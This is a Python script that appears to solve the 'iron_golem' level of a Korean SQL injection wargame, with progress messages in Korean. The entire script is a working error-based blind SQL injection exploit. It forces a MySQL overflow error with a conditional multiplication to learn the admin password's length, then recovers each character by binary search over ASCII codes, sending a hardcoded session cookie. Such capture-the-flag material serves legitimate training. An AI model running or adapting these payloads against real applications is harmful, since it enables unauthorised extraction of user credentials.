import requests

def send(param):
    url = "https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php"
    cookie = "dfksep8hnmequ6sm0qe1iu65pa"
    head = {"PHPSESSID":f"{cookie}"}
    my_url = url+param
    res = requests.get(my_url, cookies=head)
    return res.text

print("💘 LoS 21을 시작합니다")

for num in range(0,100):
    param=f"?pw=' or id='admin' and if(length(pw)={num}, 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) %23"
    if("out of range" in send(param)):
        print(f"👏 pw의 길이는 {num}입니다!")
        break

ans=""

for len in range(1, num+1):
    start = 32
    end = 127
    while True:
        middle = round((start+end)/2)
        param=f"?pw=' or id=\"admin\" and if(ascii(substr(pw,{len},1))>={middle}, 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) %23"
        if("out of range" in send(param)):
            param=f"?pw=' or id=\"admin\" and if(ascii(substr(pw,{len},1))={middle}, 0xFFFFFFFFFFFFFF*0xFFFFFFFFFFFFFF, 1) %23"
            if("out of range" in send(param)):
                print(f"{len}번째 문자 → {chr(middle)}")
                ans+=chr(middle)
                break
            else:
                start = middle
                continue
        else:
            end = middle
            continue

print(f"👏 pw의 정체는 [{ans}]입니다!")
